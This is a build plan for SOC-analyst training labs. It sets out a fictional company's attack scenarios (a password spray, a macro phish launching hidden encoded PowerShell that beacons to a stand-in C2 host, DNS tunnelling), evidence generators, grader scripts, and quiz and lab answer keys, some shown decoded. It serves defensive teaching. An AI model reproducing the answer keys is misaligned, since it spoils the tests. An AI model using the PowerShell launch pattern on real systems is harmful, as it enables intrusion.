# SOC Track — Phase 0 + Phase 1 Build Plan (v1)

**Mode:** plan only — produced 2026-07-12 per Phase Builder step 3 (PROMPTS.md Prompt 2).
**Binding content spec:** `docs/curriculum/soc-analyst-lab-curriculum-v1.md` (Phase 0 + 1).
**Binding mechanical spec:** `docs/kit-contracts.md` + the soc quality gates in `PROMPTS.md`.
**Scope:** 11 labs — p0: L0.1–L0.3 (gate L0.3), p1: L1.1–L1.8 (gate L1.8) — plus the
`tools/genevidence/` generator that all soc evidence flows through.

## 0. Ground rules this plan follows

- Lab list is map-exact: ids, titles, types, gate placement — no deviations proposed.
- Evidence is **generated, never hand-written** (PROMPTS.md soc gate): each scenario is a
  `scenario.yaml`; the generator emits BOTH the evidence files and the answer key from that
  single source of truth, so keys can never drift from evidence.
- Every lab is gradeable **offline inside the check fence** (`env -i`, no network, stdin
  `/dev/null`, 120s, no absolute paths, checklib helpers + `ck_summary`).
- Raw evidence files are never defanged; all prose (lab.md, briefs, narratives) defangs
  (`hxxp://`, `evil[.]example`).
- ADHD contract: one concept per lab, est 10–20 min, zero prerequisite reading.

## 1. Shared foundation A — the Coppermine universe

All p0/p1 evidence lives in one fictional org so labs rhyme instead of resetting context.
Canonical entities (single source: `tools/genevidence/universe.yaml`):

- **Org:** Coppermine Logistics — regional freight & 3PL, ~400 staff, HQ Duluth MN.
  Local tz America/Chicago (CDT = UTC−5 in scenario week). AD NetBIOS `COPPERMINE`;
  DNS zone `coppermine.example` (RFC-2606 reserved → unroutable, still realistic).
- **Scenario week:** all timestamps inside `2026-03-09T00:00Z … 2026-03-13T23:59Z` (Mon–Fri).
- **Servers (10.20.10.0/24):** `DC01` 10.20.10.5 (Win 2022, AD DS+DNS); `FS01` 10.20.10.8
  (file server); `SRV-BACKUP` 10.20.10.9 (02:00Z robocopy job as `svc_backup`); `WEB01`
  10.20.10.20 (Ubuntu 22.04, nginx+sshd, public via NAT 192.0.2.44).
- **Workstations:** `WKS-ACCT-07` 10.20.30.107 (m.reyes, AP); `WKS-ENG-12` 10.20.31.112
  (d.okafor, Eng); `WKS-HD-03` 10.20.30.103 (j.walsh, Helpdesk).
- **People:** m.reyes; d.okafor; j.walsh; t.aoki (IT admin — PsExec/RDP authorized under
  change tickets, e.g. CHG-2143); `svc_backup` (interactive logon never expected).
- **Formats:** zeek conn/dns/http TSV (`#fields` headers); Windows Security + Sysmon as
  winlogbeat-shaped ECS JSON (`event.code` 4624/4625/4688/4720/4732; Sysmon 1/3/11/13);
  `/var/log/auth.log` syslog; Entra-style sign-in JSON; SIEM alert JSON
  `{alert.id, @timestamp, rule{id,name,version,severity,risk_score,threat{tactic,technique}},
  entities, evidence{event_ids[],query}, status}`.
- **Grounding convention:** every generated event carries `event.id` `CM-<MMDD>-<seq>`
  (alerts `CM-A-<n>`). Answer keys and learner citations use these ids — deliberately the
  same claim-must-cite-a-real-event contract Phase 7's VERIFY labs will grade.
- **Attacker infra (fictional):** C2 203.0.113.66 = `c2.stonewick.example`; payload host
  198.51.100.23 = `cdn.stonewick.example`; phish sender 198.51.100.71; typosquat
  `copperm1ne-billing.example`; DNS-tunnel zone `*.tun.stonewick.example`.
- **Benign externals:** research scanner 192.0.2.199; NTP 192.0.2.10; Bluewater Security —
  authorized pentest 2026-03-10 from 192.0.2.150 (engagement letter on file); VPN gw 192.0.2.45.
- **Recurring motifs** (shared across labs, each lab still has its own scenario.yaml):
  - **M1 spray** — 2026-03-11 14:05–14:25Z password spray from 203.0.113.66 vs OWA/VPN;
    4625s across 40+ users; one success: m.reyes `2026-03-11T14:22:31Z`.
  - **M2 macro** — 2026-03-11 15:02Z phish `invoice_2026-03.docm` from
    `billing@copperm1ne-billing[.]example` to m.reyes; 15:41Z WINWORD.EXE →
    `powershell.exe -nop -w hidden -enc …`; Run-key persistence; 300s ±10% beacon to
    `c2.stonewick[.]example:443`.
  - **M3 tunnel** — 2026-03-12 09:00Z+, WKS-ENG-12 bursts long random-subdomain queries
    under `tun.stonewick[.]example`, NXDOMAIN-heavy.
  - **Benign background** — svc_backup 02:00Z job; t.aoki PsExec (CHG-2143) 2026-03-10
    10:00Z; scanner sweep of WEB01 2026-03-09.

## 2. Shared foundation B — `tools/genevidence/`

Built first in the phase session; all 10 scenarios flow through it.

- **Layout:** `tools/genevidence/{genevidence.py, universe.yaml, scenarios/*.yaml, verify.py}`.
  Python 3 + PyYAML; scapy only for the one pcap fixture (L0.1). Authoring-time tooling:
  generated artifacts are **committed** into each lab's `files/`; learners never run it.
- **Flow:** `scenario.yaml` → emitters (ecs-jsonl, zeek-tsv, syslog, entra-json, alert-json,
  sigma-passthrough, markdown-cards, pcap) → writes the lab's `files/` artifacts **and**
  rewrites the generated key block inside that lab's `check.sh`:
  `# --- BEGIN GENERATED KEY (genevidence: <scenario-id>) --- … # --- END ---`
  containing base64 `KEY_QN_B64=` constants. check.sh stays self-contained and lint-clean;
  keys physically cannot drift from evidence.
- **`verify.py` (CI-style consistency check, PROMPTS.md-required):** every timestamp inside
  the scenario window; every IP/host resolves to a universe entity; every answer-key event
  id exists in the emitted evidence; every alert `evidence.event_ids` ⊆ emitted events;
  raw artifacts contain no defanged forms; prose files contain no un-defanged IOCs.
  Wired into `tools/lint-labs.sh`'s run path for soc labs (or run alongside it pre-commit).
- **Graded-answers convention (all DECODE/TRIAGE):** `files/answers.template.txt` ships
  `qN=` lines; learner completes it as `answers.txt` in the workspace. Values are single
  lowercase tokens (`tp|fp|btp`, `h|e`, source slugs like `zeek-dns`, technique ids like
  `t1110.003`, event ids like `cm-0311-0142`); lists comma-joined, no spaces; timestamps
  ISO-8601 UTC.

### 2.1 Canonical grading pattern (binding for every check.sh below)

The review panel (§3.5) found seven different hand-rolled `assert_cmd_ok`/`harness_err`
shapes across the drafts, three of which cannot execute at all under checklib's
exec-argv contract, and three more that misuse `harness_err` (exit 70, "harness bug") for
an ordinary wrong answer — breaking collect-all and, in one case, leaking the key. Every
per-lab "Grading" section below has been rewritten to this single pattern; do not
improvise a variant during the build:

```bash
# 1. Presence check (once per file)
assert_file_exists "answers.txt"

# 2. Normalize once, plain bash — never inside assert_cmd_ok (pipes/redirects don't
#    survive exec-argv). The sed strip is load-bearing: several templates carry an
#    inline "# y|n"-style grammar comment on the same line as the qN= field, and
#    without stripping it a CORRECT answer fails the anchored match below.
tr 'A-Z' 'a-z' < answers.txt | sed 's/#.*//' | tr -d '[:space:]' > .answers.norm

# 3. One assertion per question, anchored, key decoded from the generated block
assert_file_contains ".answers.norm" "^q1=<decoded-key-1>$"
# ... one per qN ...

# 4. ck_summary last
```

For simple tool-presence checks (no answers.txt involved) use `assert_cmd_ok` with its
full documented signature, always: `assert_cmd_ok "desc" "hint" -- cmd args...` — never a
single quoted `'[ ... ]'` string (it is exec'd as one literal argv word and can never run).

`harness_err` is reserved **exclusively** for a missing/corrupt GENERATED KEY block (an
authoring bug) — never for a learner's wrong or missing answer. A wrong answer is always
a failed `assert_file_contains`, which `ck_summary` reports as a normal graded failure
(exit 1) and which never prints the expected value.

### 2.2 Canonical event/rule registry (binding — resolves cross-scenario collisions)

Independent per-lab scenario yamls minted `CM-<MMDD>-<seq>` ids without a shared
allocator, which the review panel caught colliding (one id, two different events) in
several places. The fix applied throughout §4/§5: the following ids are now **pinned
canon**, reused verbatim by every lab that touches the same motif event, instead of each
scenario minting its own:

| Canonical id | Event | Used by |
|---|---|---|
| `CM-0311-0142` | M1 success — 4624 type 3, m.reyes, DC01, 14:22:31Z | L0.1, L0.2 (q3 example), L1.3, L1.5, L1.7 |
| `CM-0311-0143` | M1 success — Entra sign-in, m.reyes/OWA, MFA absent, 14:22:31Z | L1.7 c1, L1.8 CM-A-51 |
| `CM-0311-0107` | M1 failure — 4625, m.reyes, DC01, 14:07:12Z | L0.2, L1.3 |
| `CM-0310-0019` | CHG-2143 — 4624 type 3, t.aoki→DC01, 10:00:12Z | L1.1, L1.7 c3 |
| `CM-0311-0201` | M2 spawn — Sysmon 1, WINWORD.EXE→powershell.exe -enc, WKS-ACCT-07, 15:41:07Z | L1.4, L1.5, L1.7 c5, L1.8 CM-A-52 |

Rule ids follow the same rule: `CM-R-<nnnn>` only (the convention L0.2 itself teaches and
grades) — no `SOC-R-*` or `RL-*` families. `CM-R-0117` (password spray) is reused verbatim
by L1.3 and L1.7 c1/c4; `CM-R-0159` (Office→encoded PowerShell) is reused by L1.7 c5 and
L1.8 CM-A-52 — deliberately, the same underlying rule firing in different labs, not a
naming coincidence. A build-time `tools/genevidence/universe-events.yaml` should encode
this table as the actual shared import so future phases don't regress it by hand.

## 3. Decisions & flagged deviations (approve/veto with the plan)

1. **Evidence pack location.** The map speaks of a shared `data/` library; the kit contract
   ships evidence per-lab via `files/`. Decision: **per-lab `files/` stays the delivery
   mechanism** (zero CLI change); the "pack" is realized as generated artifacts committed
   under each lab, sources in `tools/genevidence/scenarios/`. Revisit only if a later phase
   needs cross-lab evidence reuse.
2. **Generated key block inside check.sh** (pattern above) — new authoring convention, no
   harness API change. shellcheck-clean by construction (plain string constants).
3. **`dig`/`whois` cannot be exercised live** in the graded path (no network in the fence).
   L0.1 grades version output + a read exercise against a staged mock whois report; live
   lookups are optional ungraded steps. Matches the map's "mock enrichment" stance.
4. **recall.json on L0.1** (p0 opener): included, sourced from README/demo-L0.0 kit
   mechanics — the demo-track precedent for "no earlier phase exists". L1.1's recall draws
   from Phase 0. No other p0/p1 lab carries recall.json (contract: openers only).
5. **L2.1 recall draft parking.** Phase Builder says the gate session drafts the next
   opener's recall while context is hot; L2.1 doesn't exist yet, so the drafted questions
   are parked in this plan (L1.8 entry) and lifted verbatim during the p2 build.
6. **Python (+ scapy) as authoring-time dependency** — not a learner dependency. Noted in
   the track README; generator + scenarios are committed and re-runnable.

## 3.5 Independent review & corrections ledger

The 11 entries in §4/§5 were drafted by one agent per lab, then reviewed by three
independent critics (map-fidelity, universe/evidence-consistency, kit-mechanics-
feasibility) working only from the drafts, the curriculum map, and `docs/kit-contracts.md`
— they did not see each other's output. Combined: **57 findings, 3 blockers, ~20 majors,
~34 minors**. Every blocker and every major that affected a specific lab's correctness was
resolved directly in the text below (not left as a note to the builder) — see §2.1/§2.2
for the two systemic fixes, and the highlights below for what changed and why.

**Blockers (all fixed):** three labs (L1.1, L1.3, L1.6) routed a wrong learner answer
through `harness_err` — an immediate exit-70 "harness bug" path that would abort the
grader before `ck_summary` ran, and in L1.6's case printed the expected key to the
learner. All three now use the canonical normalize-then-`assert_file_contains` pattern
(§2.1). Separately, four labs (L0.2, L0.3, L1.5, L1.8) passed `assert_cmd_ok` a
single quoted `'[ ... ]'` string, which checklib execs as one literal argv word and can
never run — rewritten to the documented signature everywhere.

**Majors (all fixed):** cross-scenario event/rule-id collisions (§2.2 table) — the worst
was `CM-0311-0187` independently assigned to two unrelated events (an L0.1 4624 success
and an L1.4 Sysmon spawn); `CM-0310-0044/0045` likewise double-booked between L1.1 and
L1.7. Rule-id namespace drift (`SOC-R-*`, `RL-*` invented in L1.7/L1.8 against the
`CM-R-*` convention L0.2 itself teaches) — renamed throughout. Defang-convention split
(final-dot-only per L0.2's graded rule vs. all-dots in L1.1's recall key and L1.8's
evidence menu) — standardized on final-dot-only, L1.1/L1.8 fixed. Workspace-path casing
(L0.2 taught `workspace/soc/l0.2` as the *real* directory, contradicting the uppercase-id
grammar in `docs/kit-contracts.md`) — reworded to teach the real path while keeping the
case-insensitive graded key. L0.3's `support_adm` (DC01) vs. L1.8's `supportadmin` (FS01)
— renamed the L0.3 account to `it_svc_tmp` so two near-identical rogue-admin names don't
read as the same event. L1.8's `attack-excerpt.json` was described as "reshipped from
L1.5" but needed rows L1.5 doesn't have — now described as an explicit superset with the
6 additional rows listed. L1.8's own open question (A4 on DC01 vs. FS01) is resolved in
favor of FS01 (keeps `t1136.001` accurate; a DC01 placement would actually be
`t1136.002`). L1.8's YAML `answer_key` block used semicolon run-on lines that parse as 5
keys instead of 15 — reformatted to one key per line. L0.3's gate only re-verified 2 of
the 5 toolbelt binaries against the map's "tools respond" clause — extended to all 5.

**Minors mostly fixed, two left as deliberate build-time calls:**
1. *L1.7 workload.* One critic flagged L1.7 (6 cases × 3 files + 12 graded values) as
   likely to run past the 20-minute ADHD ceiling and suggested dropping two of the six
   citation requirements (`q2e`/`q5e`). Not applied here — all six citations are now
   internally consistent (the id fixes above resolved the only thing that made them
   *wrong*, not just *slow*), and cutting scope is a judgment call about pacing, not
   correctness. Flag for the builder to time honestly during self-test and trim then if
   it's genuinely tight.
2. *M3 foothold gap.* L1.1 has WKS-ENG-12 resolving `c2.stonewick.example` on 2026-03-10
   at 13:12:47Z, but no lab establishes how that host got a foothold before then (M1/M2
   target m.reyes, and L0.3's card 3 explicitly says d.okafor never clicked the 03-09
   phish). This is a narrative gap, not a grading defect — nothing in §4/§5 keys against
   it — but the builder should either add one line to the universe brief (§1) describing
   a small M3-specific foothold on WKS-ENG-12 before 03-10, or retime L1.1's teaser query
   into the 03-12 window where M3 is otherwise anchored.

## 4. Phase 0 — labs

### L0.1 - Analyst toolbelt - install/verify jq, tshark, dig, whois, ripgrep

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L0.1 | Analyst toolbelt - install/verify `jq`, `tshark`, `dig`, `whois`, `ripgrep` | GUIDED | false | 15 |

meta.json objective: "Install the five analyst tools, then prove each works by extracting one fact from staged Coppermine evidence." lab.md BRIEF (<=10 lines): the analyst toolbelt, why each tool exists, and the rule that installs happen live but grading is offline.

**TEACHING ARTIFACT**

Files staged (files/ -> workspace/soc/L0.1/; all four generated by scenario `s0-fixtures`, committed):
- `sample-event.json` - ONE pretty-printed Winlogbeat-shaped ECS JSON object: `@timestamp` `2026-03-11T14:22:31Z`, `event.code` `"4624"`, `event.id` `"CM-0311-0142"`, `host.name` `"DC01"`, `user.name` `"m.reyes"`, `source.ip` `"203.0.113.66"`, `winlog.logon.type` `3` (the M1 spray-success event - Phase 1 re-meets it). Answer-bearing field: `.user.name`.
- `fixtures.pcap` - scapy-built, 8 packets: 4 DNS A queries + 4 responses, 10.20.30.107 (WKS-ACCT-07) -> 10.20.10.5:53 (DC01); qnames `coppermine.example`, `www.`, `fs01.`, `dc01.` prefixes; www answers A 192.0.2.44, internal names answer 10.20.10.x; t0 2026-03-09T13:05:00Z, +2s per exchange. Answer-bearing field: `dns.qry.name`.
- `notes/triage-notes.txt` - 14-line plaintext shift-handoff note by j.walsh dated 2026-03-09: mentions scanner `192.0.2[.]199` sweeping WEB01 and the 02:00Z svc_backup robocopy job (analyst prose, so defanged); line 9 exactly: `escalation-marker: CM-TOOLBELT-7C42`. Answer-bearing line: 9.
- `whois-stonewick.txt` - mock whois for stonewick.example: `Registrar: Nimbus Domains LLC`; `Creation Date: 2026-02-27T18:44:09Z`; `Registrant Organization: REDACTED FOR PRIVACY`; `Name Server: ns1.stonewick.example` / `ns2.stonewick.example`. Answer-bearing line: Creation Date (quiz Q1).

Learner task (GUIDED STEPS; installs run in the real env - only workspace artifacts are graded; no answers.template.txt in this lab, GUIDED grades produced artifacts directly):
1. `sudo apt-get update && sudo apt-get install -y jq tshark dnsutils whois ripgrep`. The tshark postinstall asks "allow non-root users to capture?" - step explains: LIVE capture needs privileges (Yes + `usermod -aG wireshark`), but READING pcaps (all this track ever does) needs none; either answer works.
2. `{ jq --version; tshark --version | head -1; dig -v 2>&1; whois --version; rg --version | head -1; } > toolcheck.txt` (called out: `dig -v` prints to stderr, hence `2>&1`).
3. `jq -r '.user.name' sample-event.json > jq_out.txt`
4. `tshark -r fixtures.pcap -T fields -e dns.qry.name | sort -u > tshark_out.txt`
5. `rg 'escalation-marker' notes/ > rg_out.txt`
6. `grep 'Creation Date' whois-stonewick.txt` - read the mock report; teaching beat: domain registered <2 weeks before the scenario week (feeds quiz Q1).
7. OPTIONAL, UNGRADED (needs live network; the check fence has none): `dig +short example.com` and `whois example.com | head -5`.
Output grammar: `toolcheck.txt` = 5 version lines; `jq_out.txt` = `m.reyes`; `tshark_out.txt` = 4 unique qnames; `rg_out.txt` = the matched marker line.

Grading (check.sh, collect-all, `ck_summary` last; all five binaries live in /usr/bin, inside the env-i PATH):
1-5. `assert_cmd_ok` per tool, full signature per Section 2.1 (`"desc" "hint" -- cmd args`): `"jq responds" "apt-get install jq" -- jq --version`, `"tshark responds" "apt-get install tshark" -- tshark --version`, `"dig responds" "apt-get install dnsutils" -- dig -v`, `"whois responds" "apt-get install whois" -- whois --version`, `"rg responds" "apt-get install ripgrep" -- rg --version`.
6. `assert_file_exists toolcheck.txt`
7-11. `assert_file_contains toolcheck.txt <ERE>` with static patterns: `jq-[0-9]`, `TShark`, `DiG [0-9]`, `Version [0-9]`, `ripgrep [0-9]`.
12. `assert_file_contains_fixed jq_out.txt "$K_JQ_USER"`
13. `assert_file_contains_fixed tshark_out.txt "$K_TSHARK_QNAME"`
14. `assert_file_contains_fixed rg_out.txt "$K_RG_MARKER"`
Embedded key block between `# --- BEGIN GENERATED KEY (genevidence: s0-fixtures) ---` / `# --- END GENERATED KEY ---`: `K_JQ_USER=m.reyes`, `K_TSHARK_QNAME=coppermine.example`, `K_RG_MARKER=CM-TOOLBELT-7C42` (base64-decoded in-script; generator-written, matches answer_key below verbatim).

Kit files:
- quiz.json (3, answers base64 at build):
  Q1 text: "Per whois-stonewick.txt, on what date was stonewick.example registered? (YYYY-MM-DD)" -> `2026-02-27` (accept: `2026-02-27t18:44:09z`).
  Q2 choice: "check.sh runs with no network. Which two tools are therefore graded on version output only, their real job practiced against staged mock reports?" a) jq and ripgrep b) dig and whois c) tshark and dig -> `b`.
  Q3 choice: "Why does the tshark install prompt about non-root users?" a) reading .pcap files requires root b) live capture needs elevated privileges; reading saved pcaps does not c) tshark refuses to start outside the wireshark group -> `b`.
- hints.json: L1 "Every graded item is a file in your workspace. Run ls and diff against the GUIDED STEPS output list - each missing file is exactly one command." L2 "toolcheck.txt wants one version line per tool; dig is the trap - `dig -v` prints to stderr, so add 2>&1 inside the brace group. The three _out.txt files come from steps 3-5 verbatim." L3 "Exact producers: the step-2 brace group > toolcheck.txt; jq -r '.user.name' sample-event.json > jq_out.txt; tshark -r fixtures.pcap -T fields -e dns.qry.name | sort -u > tshark_out.txt; rg 'escalation-marker' notes/ > rg_out.txt."
- recap.md (3 lines): "jq reads JSON logs, tshark reads pcaps, ripgrep searches haystacks, dig and whois profile infrastructure." / "Graders run offline in a fenced workspace, so network tools verify by version output plus staged mock reports." / ".example domains and TEST-NET IPs are RFC-reserved - Coppermine evidence looks real but can never route."
- recall.json (phase opener; 5, non-gating; drawn from kit README + demo lab L0.0 per direction):
  R1 text: "Which command re-orients you after a break - last lab, last recap, next step?" -> `lab resume` (accept: `resume`). source: "README CLI table / L0.0".
  R2 choice: "You pass check.sh but score 2/3 on the quiz. Lab result?" a) passed b) not passed - the quiz gates at 3/3 c) passed with a warning -> `b`. source: "L0.0 grading walkthrough".
  R3 text: "Jumping past the frontier with --force stamps every not-yet-completed lab before the target with which permanent mark (one word)?" -> `skipped`. source: "README --force semantics".
  R4 choice: "check.sh executes with its working directory set to:" a) the lab's files/ dir in the repo b) your copy under workspace/<track>/<id>/ c) wherever you ran lab check -> `b`. source: "L0.0 workspace-fence demo".
  R5 text: "How many escalating hint levels does lab hint hold before it has nothing left?" -> `3`. source: "README hint ladder".

**EVIDENCE SPEC**

```yaml
scenario: s0-fixtures        # SHARED with L0.2 - one yaml emits both labs' files/ + both key blocks
window: {start: "2026-03-09T00:00:00Z", end: "2026-03-13T23:59:59Z"}
actors: {m.reyes: WKS-ACCT-07, j.walsh: WKS-HD-03, svc_backup: SRV-BACKUP}
hosts: {DC01: 10.20.10.5, WEB01: 10.20.10.20, WKS-ACCT-07: 10.20.30.107}   # WEB01 NAT 192.0.2.44
externals: {c2: 203.0.113.66, scanner: 192.0.2.199}
benign_background:
  - {day: 2026-03-09, action: scanner-sweep, src: 192.0.2.199, dst: WEB01}   # prose-only -> triage-notes.txt
  - {daily: "02:00Z", action: backup-robocopy, user: svc_backup}             # prose-only -> triage-notes.txt
attacker_actions:
  - {at: "2026-03-11T14:22:31Z", motif: M1, action: logon-success, host: DC01, user: m.reyes,
     src: 203.0.113.66, logon_type: 3, event_code: 4624, event_id: CM-0311-0142}
emit:
  - {artifact: ecs_event_single, ref: CM-0311-0142, to: [L0.1/files/sample-event.json]}
  - {artifact: dns_pcap, packets: 8, client: 10.20.30.107, server: 10.20.10.5, t0: "2026-03-09T13:05:00Z",
     step: 2s, qnames: [coppermine.example, www.coppermine.example, fs01.coppermine.example,
     dc01.coppermine.example], to: [L0.1/files/fixtures.pcap]}   # scapy
  - {artifact: handoff_notes, author: j.walsh, lines: 14, marker_line: 9,
     marker: "escalation-marker: CM-TOOLBELT-7C42", to: [L0.1/files/notes/triage-notes.txt]}
  - {artifact: whois_mock, domain: stonewick.example, registrar: "Nimbus Domains LLC",
     created: "2026-02-27T18:44:09Z", ns: [ns1.stonewick.example, ns2.stonewick.example],
     to: [L0.1/files/whois-stonewick.txt]}
  # L0.2 emits (evidence-pack tree/catalog artifacts) are specified in the L0.2 entry
answer_key:
  L0.1:
    K_JQ_USER: m.reyes                    # check.sh assertion 12
    K_TSHARK_QNAME: coppermine.example    # check.sh assertion 13
    K_RG_MARKER: CM-TOOLBELT-7C42         # check.sh assertion 14
    quiz_q1_whois_created: "2026-02-27"   # quiz.json Q1
```

### L0.2 - Meet the lab CLI and the evidence pack - where everything lives

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L0.2 | Meet the lab CLI and the evidence pack - where everything lives | GUIDED | false | 10 |

**TEACHING ARTIFACT**

- **Files staged** (`files/` → `workspace/soc/L0.2/` on start):
  - `README-evidence.md` (static prose, ~40 lines; documentation, not evidence — generator exemption justified below). Sections, in order: (1) *Pack layout* — every SOC lab stages evidence + `answers.template.txt`; `lab start` copies `files/` into `workspace/soc/<lab-id>` — **this exact sentence carries the q4 answer** — the real directory is `workspace/soc/L0.2`; grading is case-insensitive, so the graded key stays lowercase. (2) *ECS naming* — field cheat-sheet: `@timestamp` (ISO-8601 UTC), `host.name`, `source.ip`, `user.name`, `event.code`, `event.id`. (3) *Event-id convention* — `CM-<MMDD>-<seq>` for events, `CM-A-<n>` for alerts, `CM-R-<n>` for rules; keys and citations always use these ids. (4) *Alert JSON shape* — annotated skeleton `{alert.id, @timestamp, rule:{id,name,version,severity,risk_score,threat:{tactic,technique}}, entities, evidence:{event_ids,query}, status}`; calls out that `evidence.event_ids` is the bridge from alert to raw log. (5) *Defang discipline* — raw evidence files are NEVER defanged; YOUR prose/notes/answers ALWAYS are: bracket the final dot (`evil[.]example`) and write `hxxp://`. (6) *Answers convention* — copy `answers.template.txt` to `answers.txt`, one `qN=value` per line, single lowercase tokens, lists comma-joined no spaces.
  - `alert-sample.json` (GENERATED, single SIEM alert, quiet M1 preview): `alert.id`=`CM-A-0001`, `@timestamp`=`2026-03-11T14:07:55Z`, `rule`:{`id`:`CM-R-0112` **← q1**, `name`:"Multiple failed logons - single source", `version`:3, `severity`:"low", `risk_score`:21, `threat`:{`tactic`:"credential-access", `technique`:"T1110"}}, `entities`:{`source.ip`:"203.0.113.66", `host.name`:"DC01"}, `evidence`:{`event_ids`:["CM-0311-0107" **← q2 (first)**, "CM-0311-0111"], `query`:"event.code:4625 AND source.ip:203.0.113.66"}, `status`:"new".
  - `events.jsonl` (GENERATED, 5 ECS JSON lines, chronological): (1) `CM-0311-0002` 4624 type 3 `svc_backup`→FS01 from 10.20.10.9 `2026-03-11T02:00:04Z` (nightly robocopy); (2) `CM-0311-0056` 4624 type 2 `m.reyes` on WKS-ACCT-07 `12:58:07Z`; (3) `CM-0311-0061` 4624 type 2 `j.walsh` on WKS-HD-03 `13:15:44Z`; (4) `CM-0311-0107` 4625 type 3 `m.reyes` on DC01, `source.ip` 203.0.113.66, `14:07:12Z` (cited); (5) `CM-0311-0111` 4625 type 3 `d.okafor` on DC01, `source.ip` 203.0.113.66, `14:07:41Z` (cited). All carry `winlog.channel`:"Security". Raw C2 IP appears undefanged — deliberate, per contract.
  - `answers.template.txt`: four lines `q1=` `q2=` `q3=` `q4=`.
- **Learner task**: lab.md BRIEF (≤10 lines) recaps in one paragraph what L0.0 demoed — `lab status` shows current lab + attempt state, `lab hint` climbs a 3-level ladder, quitting mid-lab is safe because `lab resume` returns to the staged workspace untouched. GUIDED STEPS then walk: read `README-evidence.md`; `jq '.rule' alert-sample.json`; `jq -r '.evidence.event_ids[]' alert-sample.json`; `grep -f` those ids against `events.jsonl`; copy template to `answers.txt` and fill:
  - `q1=` rule id of the staged alert (grammar: `cm-r-<nnnn>` lowercase)
  - `q2=` event.id of the FIRST cited evidence event (grammar: `cm-<mmdd>-<nnnn>`)
  - `q3=` defanged form of `c2.stonewick.example` (grammar: fqdn with `[.]` before tld)
  - `q4=` directory `lab start` copies `files/` into for THIS lab (grammar: `workspace/soc/<lab-id>` lowercase)
- **Grading** (check.sh; canonical pattern per Section 2.1 — no ad hoc `assert_cmd_ok` shell strings):
  1. `assert_file_exists "answers.txt"`
  2. `assert_file_exists "events.jsonl"`; `assert_file_exists "alert-sample.json"` (workspace intact)
  3. `assert_file_contains "answers.txt" '^q1='` … `'^q4='` (4 calls, completeness before value checks)
  4. Normalize once (plain bash, Section 2.1 recipe) to `.answers.norm`; then `assert_file_contains ".answers.norm" "^q1=<K1>$"` … `"^q4=<K4>$"` (4 calls, keys decoded from the generated base64 block)
  5. `ck_summary`
  Embedded key block: `# --- BEGIN GENERATED KEY (genevidence: s0-fixtures) ---` / `KEY_Q1_B64=Y20tci0wMTEy` `KEY_Q2_B64=Y20tMDMxMS0wMTA3` `KEY_Q3_B64=YzIuc3RvbmV3aWNrWy5dZXhhbXBsZQ==` `KEY_Q4_B64=d29ya3NwYWNlL3NvYy9sMC4y` / `# --- END GENERATED KEY ---` (decodes: `cm-r-0112`, `cm-0311-0107`, `c2.stonewick[.]example`, `workspace/soc/l0.2`).
- **Kit files**:
  - `meta.json`: `{"id":"L0.2","title":"Meet the lab CLI and the evidence pack - where everything lives","type":"GUIDED","objective":"Navigate the evidence-pack contract: ECS fields, CM- event ids, alert-to-event citation, defang discipline, answers convention.","gate":false,"est_minutes":10}`
  - `quiz.json` (3, gates 3/3):
    1. (choice) "A raw evidence file in your workspace contains 203.0.113.66. Per the pack contract you should:" A) defang it in the file B) leave the file raw; defang only in your own prose/answers C) delete the IOC D) re-generate the evidence → **B**
    2. (choice) "Which alert field lists the raw events that made the rule fire?" A) `entities` B) `rule.threat.technique` C) `evidence.event_ids` D) `status` → **C**
    3. (choice) "In event id CM-0311-0142, `0311` encodes:" A) sequence number B) month+day (Mar 11) C) rule number D) host octets → **B**
  - `hints.json`: L1 "Two files hold everything: alert-sample.json (try `jq '.rule'` and `jq '.evidence'`) and README-evidence.md (defang rule + the sentence about where files/ get copied). q2 wants the FIRST id in a list." L2 "q1: `jq -r '.rule.id'`. q2: `jq -r '.evidence.event_ids[0]'`. q3: the README defang rule brackets the final dot only. q4: the README names the path pattern `workspace/soc/<lab-id>` — substitute this lab's id, lowercased." L3 "q1 and q2 are the two jq outputs, lowercased. q3: take c2.stonewick.example and replace the last dot with `[.]`. q4: this lab's id is L0.2, so the path is workspace/soc/ followed by l0.2."
  - `recap.md` (3 lines, no bullets): `Raw evidence is never defanged; everything you write about it always is (hxxp://, evil[.]example).` / `Alerts cite raw events by CM-<MMDD>-<seq> id in evidence.event_ids - that list is your pivot into the logs.` / `lab start copies files/ into workspace/soc/<lab-id>; answers.txt in that copy is what check.sh grades.`
  - `recall.json`: none — L0.1 is the phase opener, not this lab.

**EVIDENCE SPEC**

```yaml
scenario: s0-fixtures            # SHARED with L0.1; single source for both labs' emits + keys
window: {start: 2026-03-09T00:00:00Z, end: 2026-03-13T23:59:59Z}
actors: [m.reyes, d.okafor, j.walsh, svc_backup]
hosts:
  DC01: 10.20.10.5
  FS01: 10.20.10.8
  SRV-BACKUP: 10.20.10.9
  WKS-ACCT-07: 10.20.30.107
  WKS-HD-03: 10.20.30.103
external_ips: {c2: 203.0.113.66}
benign_background:
  - {t: 2026-03-11T02:00:04Z, event: 4624/type3, user: svc_backup, host: FS01, src: 10.20.10.9, id: CM-0311-0002}
  - {t: 2026-03-11T12:58:07Z, event: 4624/type2, user: m.reyes, host: WKS-ACCT-07, id: CM-0311-0056}
  - {t: 2026-03-11T13:15:44Z, event: 4624/type2, user: j.walsh, host: WKS-HD-03, id: CM-0311-0061}
attacker_actions:                # M1 preview only: first minutes of the spray, no success event
  - {t: 2026-03-11T14:07:12Z, event: 4625/type3, user: m.reyes, host: DC01, src: 203.0.113.66, id: CM-0311-0107}
  - {t: 2026-03-11T14:07:41Z, event: 4625/type3, user: d.okafor, host: DC01, src: 203.0.113.66, id: CM-0311-0111}
alerts:
  - {id: CM-A-0001, t: 2026-03-11T14:07:55Z, rule_id: CM-R-0112, rule_name: "Multiple failed logons - single source",
     severity: low, risk_score: 21, tactic: credential-access, technique: T1110,
     cites: [CM-0311-0107, CM-0311-0111], status: new}
emit:
  events_jsonl: tracks/soc/phases/p0/L0.2-evidence-pack/files/events.jsonl     # all 5 events above
  alert_json:   tracks/soc/phases/p0/L0.2-evidence-pack/files/alert-sample.json # CM-A-0001
answer_key:                      # generator writes these into check.sh key block, base64-encoded
  q1: cm-r-0112
  q2: cm-0311-0107
  q3: c2.stonewick[.]example     # static-derived: defang exercise, not present in evidence files
  q4: workspace/soc/l0.2         # static-derived: kit convention, stated verbatim in README-evidence.md
```

